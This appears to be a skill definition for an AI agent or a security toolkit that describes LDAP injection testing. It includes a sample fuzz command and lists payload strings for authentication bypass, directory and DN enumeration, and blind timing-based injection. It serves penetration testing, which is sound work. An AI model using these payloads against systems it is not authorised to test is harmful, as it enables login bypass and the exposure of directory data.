---
name: ldap_injection_testing
description: "LDAP injection vulnerability detection and exploitation"
triggers:
  - ldap
  - ldap injection
  - directory
  - active directory
  - anonymous bind
  - dn
  - cn
metadata:
  category: fuzzing
  tools: [fuzzer]
  scope: targets
---

## Overview

LDAP injection testing finds vulnerabilities in applications that interact with LDAP directories (Active Directory, OpenLDAP) without proper input sanitization.

## Capabilities

- LDAP injection detection
- Authentication bypass
- Directory enumeration
- Blind LDAP injection (using timing)
- Filter manipulation
- DN extraction
- Attribute enumeration

## Usage

### Basic LDAP Injection Test

```bash
eggsec fuzz --target https://example.com/search?user=admin --type ldap-injection
```

## Payloads Reference

**Authentication Bypass:**
```
admin)(&)
admin)(|(password=*)
*))(&(password=a
```

**DN Extraction:**
```
* (enumerate all)
admin*(display all admin entries)
)(attribute=* (wildcard search)
```

**Blind Injection:**
```
admin)(&(password=*)(timeout=5000)
```

## Triggers

Keywords: ldap, ldap injection, directory, active directory, bind, dn, cn, ou, search, filter, enumerate, authentication

## Best Practices

1. Test login forms that may query LDAP
2. Look for user search functionality
3. Use timing-based detection for blind injection
4. Check for proper input encoding/escaping
5. Enumerate attributes if injection succeeds